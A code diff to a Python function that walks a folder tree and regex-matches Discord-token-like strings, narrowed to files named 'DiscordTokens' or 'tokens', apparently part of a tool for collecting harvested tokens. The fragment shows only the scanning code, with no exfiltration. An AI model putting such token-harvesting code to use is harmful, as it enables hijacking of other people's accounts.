@@ -36,10 +36,14 @@ def search_tokens(folder):
     
     # Regex pattern to match tokens with length between 59 and 64 characters
     token_pattern = r"[A-Za-z0-9-_]{59,64}"
+
+    # Specify the filenames you want to check
+    target_files = ["DiscordTokens", "tokens"]
     
     for dirpath, dirnames, filenames in os.walk(folder):
         for filename in filenames:
-            if filename.lower().endswith('.txt'):  # Only search in .txt files
+            # Check if the filename matches "DiscordTokens" or "tokens"
+            if filename in target_files:  
                 file_path = os.path.join(dirpath, filename)
                 with open(file_path, 'r', errors='ignore') as f:
                     content = f.read()
